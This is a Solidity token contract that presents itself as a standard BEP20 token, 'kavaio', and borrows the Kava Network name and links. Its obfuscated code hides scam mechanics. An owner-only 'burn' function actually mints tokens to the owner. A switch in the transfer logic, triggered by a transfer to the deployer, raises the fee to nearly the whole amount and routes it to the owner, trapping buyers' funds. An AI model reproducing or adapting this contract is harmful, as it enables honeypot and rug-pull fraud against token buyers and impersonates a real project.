/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

/*
Kava Network
@kava_platform
Kava believes in a #Web3 future. #Kava is a decentralized blockchain that is optimized for protocol growth.
https://www.kava.io/
https://t.me/kavalabs
https://twitter.com/kava_platform
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.14;
contract kavaio {
address private  WHAOBF = address(0);
uint256 private  RPPYAW = 1000000000000000000;
uint256 public constant WUWOPT = 99999;
string public  name = "kavaio";
string public  symbol = "kavaio";
mapping (address => uint256) public balanceOf;
uint256 private  AYNORA = 100000000;
address private  YVPZJE = address(0);
uint256 private  AKSSBB = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  BQYXUW = address(0);
address private  LYRLFD = address(0);
uint256 private  ZOFJLX = 1000000000000000000000;
uint8 public constant decimals = 18;
uint256 private  QVKMWP = 10000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  KLLLPN = 1000000000000000;
uint256 private  RJXNPP = 10000000000;
address private  ALRRYD = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
function _getYVPZJE() private returns (address) {
return YVPZJE;
}

function _getKLLLPN() private returns (uint256) {
return KLLLPN;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getQVKMWP() private returns (uint256) {
return QVKMWP;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getZOFJLX() private returns (uint256) {
return ZOFJLX;
}

function _getAYNORA() private returns (uint256) {
return AYNORA;
}

function _getBQYXUW() private returns (address) {
return BQYXUW;
}

function _getRJXNPP() private returns (uint256) {
return RJXNPP;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () {
WHAOBF = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getAKSSBB() private returns (uint256) {
return AKSSBB;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getALRRYD() private returns (address) {
return ALRRYD;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getLYRLFD() private returns (address) {
return LYRLFD;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tABIBPD 0");
require(spender != address(0), "fABIBPD 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ABIBPD");
require(to != address(0), "ABIBPD");
require(amount <= balanceOf[from], "ABIBPD");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* WUWOPT/RPPYAW ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==WHAOBF){
RPPYAW = WUWOPT+2;
}
emit Transfer(from, to, transferAmount);
}

}